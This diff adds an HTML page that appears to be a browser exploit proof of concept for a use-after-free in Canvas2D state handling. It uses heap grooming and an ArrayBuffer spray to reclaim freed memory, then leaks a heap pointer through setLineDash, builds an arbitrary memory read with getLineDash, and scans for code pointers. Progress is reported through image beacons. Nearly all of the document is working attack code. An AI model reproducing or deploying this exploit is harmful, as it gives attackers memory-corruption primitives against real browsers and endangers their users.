@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V627</title></head>
+<body><pre id="out">V627 — groomed portablelle state buffer leak</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+
+var _imgs=[];
+for(var i=0;i<60;i++) _imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++%60];
+  img.src='/beacon/V627-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _b8b=new ArrayBuffer(8),_bu64;
+try{_bu64=new BigUint64Array(_b8b);}catch(e){}
+var _f64b=new Float64Array(_b8b);
+function f2h(v){_f64[0]=v;return ('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+function f2i(v){if(_bu64){_f64b[0]=v;return _bu64[0];}return null;}
+
+bk('BOOT','v627-groomed-portablelle');
+
+/* === CONSTANTS ===
+ * Context = 768B (libpas size class)
+ * State = 400B, lineWidth@+48, lineDash@+168
+ * 8 saves + realize → cap=11, buf=11*400=4400B → libpas class 4608B
+ * state[8].lineWidth = 8*400+48 = 3248 bytes into buffer
+ * state[8].lineDash.m_buffer = 8*400+168 = 3368
+ * state[8].lineDash.m_capacity = 3376, m_size = 3380 */
+var NSAVES = 8;
+var STATE_SIZE = 400;
+var BUF_CLASS = 4608;
+var TOP_IDX = NSAVES;
+var LW_OFF = TOP_IDX * STATE_SIZE + 48;
+var LD_BUF_OFF = TOP_IDX * STATE_SIZE + 168;
+var LD_CAP_OFF = LD_BUF_OFF + 8;
+var LD_SIZE_OFF = LD_CAP_OFF + 4;
+var MARKER = 6.02214076e23;
+var SPRAY_N = 200;
+var GROOM_768 = 40;
+var GROOM_4608 = 40;
+
+bk('CFG','buf='+BUF_CLASS+',lw='+LW_OFF+',ld='+LD_BUF_OFF+',spr='+SPRAY_N+',g7='+GROOM_768+',g4='+GROOM_4608);
+
+/* ============================================================
+ * PHASE 0: GROOM — fill libpas pages for both size classes
+ * so freeing one context + state buffer doesn't decommit pages
+ * ============================================================ */
+
+/* Groom 768B page: create many Canvas2D contexts (each 768B) */
+var groomCanvases = [];
+var groomCtxs = [];
+for (var gi = 0; gi < GROOM_768; gi++) {
+  var gc = document.createElement('canvas');
+  gc.width = 1; gc.height = 1;
+  var gx = gc.getContext('2d');
+  groomCanvases.push(gc);
+  groomCtxs.push(gx);
+}
+
+/* Groom 4608B page: pre-allocate ABs of same size class */
+var groomABs = [];
+for (var gi2 = 0; gi2 < GROOM_4608; gi2++) {
+  groomABs.push(new ArrayBuffer(BUF_CLASS));
+}
+
+bk('GROOM','ok-768='+groomCtxs.length+',4608='+groomABs.length);
+
+/* Pre-allocate spray array */
+var abs = new Array(SPRAY_N);
+for (var _p = 0; _p < SPRAY_N; _p++) abs[_p] = 0;
+
+/* ============================================================
+ * PHASE 1: UAF TRIGGER
+ * bitmaprenderer outer + 2d inner + defineProperty
+ * Inside getter: 8 saves + lineWidth set → realizeSaves → external buffer
+ * After return: context destroyed → 768B + 4608B freed
+ * BUT: pages stay committed because groom objects still live there
+ * ============================================================ */
+var canvas = document.createElement('canvas');
+canvas.width = 1; canvas.height = 1;
+var innerCtx = null;
+var uafOpts = {};
+Object.defineProperty(uafOpts, 'alpha', { get: function() {
+  innerCtx = canvas.getContext('2d');
+  for (var i = 0; i < NSAVES; i++) innerCtx.save();
+  innerCtx.lineWidth = MARKER;
+  return true;
+}});
+
+canvas.getContext('bitmaprenderer', uafOpts);
+
+if (!innerCtx) { bk('DEAD','no-ctx'); say('DEAD'); }
+
+bk('UAF','trigger-ok');
+
+/* ============================================================
+ * PHASE 2: FLUSH deallocation log
+ * libpas caches frees in thread-local dealloc log (~512 entries).
+ * We flush by allocating+freeing many small objects, forcing log drain.
+ * This makes the freed 4608B slot available for reallocation.
+ * ============================================================ */
+var flushJunk = [];
+for (var fi = 0; fi < 600; fi++) {
+  flushJunk.push(new ArrayBuffer(64));
+}
+flushJunk = null;
+
+bk('FLUSH','ok');
+
+/* ============================================================
+ * PHASE 3: SPRAY AB(4608) to reclaim state buffer
+ * NO READ BEFORE SPRAY — reading freed memory crashes!
+ * The spray puts zero-filled ABs at the freed state buffer address.
+ * ============================================================ */
+for (var si = 0; si < SPRAY_N; si++) abs[si] = new ArrayBuffer(BUF_CLASS);
+
+bk('SPRAY','n='+SPRAY_N);
+
+/* ============================================================
+ * PHASE 4: READ through dangling wrapper
+ * innerCtx → freed 768B (page committed via groom) →
+ * m_stateStack.m_buffer → freed 4608B (reclaimed by AB) →
+ * lineWidth at offset 3248 in AB → should read 0.0 or MARKER
+ * ============================================================ */
+var readLW = -999;
+try { readLW = innerCtx.lineWidth; } catch(e) { readLW = -888; }
+
+var readStatus;
+if (readLW === -888) readStatus = 'ERR';
+else if (readLW === 0) readStatus = 'RECLAIMED';
+else if (Math.abs(readLW - MARKER) < 1e10) readStatus = 'STALE';
+else readStatus = 'OTHER:' + f2h(readLW);
+
+bk('R1', readStatus);
+say('R1: ' + readStatus);
+
+/* ============================================================
+ * PHASE 5: WRITE marker + SCAN to find which AB aliased
+ * ============================================================ */
+var writeOK = 0;
+try { innerCtx.lineWidth = 1.717; writeOK = 1; } catch(e) {}
+
+bk('W1', 'ok=' + writeOK);
+say('W1: writeOK=' + writeOK);
+
+var targetAB = null, targetIdx = -1;
+if (writeOK) {
+  var expectedSlot = LW_OFF / 8;
+  for (var j = 0; j < SPRAY_N; j++) {
+    var fv = new Float64Array(abs[j]);
+    if (fv[expectedSlot] === 1.717) { targetAB = abs[j]; targetIdx = j; break; }
+    for (var k = 0; k < fv.length; k++) {
+      if (fv[k] === 1.717) { targetAB = abs[j]; targetIdx = j; break; }
+    }
+    if (targetIdx >= 0) break;
+  }
+}
+
+bk('HIT', 'idx=' + targetIdx);
+say('HIT: idx=' + targetIdx);
+
+/* ============================================================
+ * PHASE 6: HEAP LEAK via setLineDash
+ * setLineDash([1,2,3,4]) allocates Vector<double> buffer on FastMalloc.
+ * Buffer pointer is written to state[8].lineDash.m_buffer in our AB.
+ * ============================================================ */
+var heapLeak = 0n, heapLeakOK = 0;
+if (targetIdx >= 0) {
+  var targetDV = new DataView(targetAB);
+  try {
+    innerCtx.setLineDash([1.0, 2.0, 3.0, 4.0]);
+    if (_bu64) {
+      _f64b[0] = 0; // clear
+      var lo = targetDV.getUint32(LD_BUF_OFF, true);
+      var hi = targetDV.getUint32(LD_BUF_OFF + 4, true);
+      heapLeak = BigInt(hi) * 0x100000000n + BigInt(lo);
+      heapLeakOK = (heapLeak > 0x10000n) ? 1 : 0;
+    }
+  } catch(e) { heapLeakOK = -1; }
+}
+
+if (heapLeakOK === 1) {
+  bk('LEAK', '***PTR=0x' + heapLeak.toString(16) + '***');
+  say('*** HEAP LEAK: 0x' + heapLeak.toString(16) + ' ***');
+} else {
+  bk('NOLEAK', 'status=' + heapLeakOK + (heapLeak ? ',val=0x'+heapLeak.toString(16) : ''));
+  say('No leak (status=' + heapLeakOK + ')');
+}
+
+/* ============================================================
+ * PHASE 7: ARB READ verification
+ * Set lineDash Vector to: m_buffer=heapLeak, m_cap=4, m_size=4
+ * getLineDash() should return [1.0, 2.0, 3.0, 4.0]
+ * ============================================================ */
+var arbReadOK = 0, arbReadVal = '';
+if (heapLeakOK === 1 && heapLeak > 0n) {
+  try {
+    var targetDV2 = new DataView(targetAB);
+    targetDV2.setUint32(LD_BUF_OFF, Number(heapLeak & 0xFFFFFFFFn), true);
+    targetDV2.setUint32(LD_BUF_OFF + 4, Number((heapLeak >> 32n) & 0xFFFFFFFFn), true);
+    targetDV2.setUint32(LD_CAP_OFF, 4, true);
+    targetDV2.setUint32(LD_SIZE_OFF, 4, true);
+    var rd = innerCtx.getLineDash();
+    if (rd && rd.length >= 1) {
+      arbReadOK = 1;
+      arbReadVal = rd[0] + ',' + rd[1] + ',' + rd[2] + ',' + rd[3];
+    }
+  } catch(e) { arbReadOK = -1; }
+}
+
+if (arbReadOK === 1) {
+  bk('ARB', '***CONFIRMED=' + arbReadVal + '***');
+  say('*** ARB READ: ' + arbReadVal + ' (expected 1,2,3,4) ***');
+} else {
+  bk('NOARB', 'status=' + arbReadOK);
+}
+
+/* ============================================================
+ * PHASE 8: SCAN nearby heap for code pointers
+ * Read 2KB before heapLeak for vtable candidates
+ * ============================================================ */
+var scanHits = [];
+if (arbReadOK === 1 && heapLeak > 8192n) {
+  try {
+    var scanDV = new DataView(targetAB);
+    var scanBase = heapLeak - 8192n;
+    scanDV.setUint32(LD_BUF_OFF, Number(scanBase & 0xFFFFFFFFn), true);
+    scanDV.setUint32(LD_BUF_OFF + 4, Number((scanBase >> 32n) & 0xFFFFFFFFn), true);
+    scanDV.setUint32(LD_CAP_OFF, 2048, true);
+    scanDV.setUint32(LD_SIZE_OFF, 2048, true);
+    var scan = innerCtx.getLineDash();
+    for (var si2 = 0; si2 < scan.length; si2++) {
+      var sv = f2i(scan[si2]);
+      if (sv !== null && sv > 0x400000n && sv < 0x800000000000n && (sv & 0x7n) === 0n) {
+        scanHits.push('+' + (si2*8) + '=0x' + sv.toString(16));
+        if (scanHits.length >= 10) break;
+      }
+    }
+  } catch(e) {}
+}
+
+if (scanHits.length > 0) {
+  bk('SCAN', scanHits.join(','));
+  say('Scan: ' + scanHits.join(', '));
+} else {
+  bk('NOSCAN', 'n=0');
+}
+
+/* Keep groom objects alive */
+canvas._groomCanvases = groomCanvases;
+canvas._groomCtxs = groomCtxs;
+canvas._groomABs = groomABs;
+canvas._abs = abs;
+
+bk('DONE', 'v627');
+say('\nDONE — waiting 20s to reload');
+setTimeout(function(){ location.reload(); }, 20000);
+</script>
+</body></html>
